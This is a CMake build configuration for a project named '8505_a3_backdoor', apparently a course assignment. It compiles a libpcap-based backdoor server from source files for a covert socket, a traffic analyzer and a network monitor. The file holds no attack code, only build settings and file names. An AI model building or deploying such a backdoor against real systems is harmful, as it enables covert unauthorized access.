cmake_minimum_required(VERSION 3.3)
project(8505_a3_backdoor)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -std=c++11 -lpcap")
# set the bin folder location
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_CURRENT_SOURCE_DIR}/bin")

set(SOURCE_FILES src/server/main.cpp src/utils/argparcer.h src/server/CovertSocket.cpp src/server/CovertSocket.h src/server/TrafficAnalyzer.cpp src/server/TrafficAnalyzer.h src/server/NetworkMonitor.cpp src/server/NetworkMonitor.h src/utils/Logger.cpp src/utils/Logger.h src/utils/Structures.h)
add_executable(8505_a3_backdoor ${SOURCE_FILES})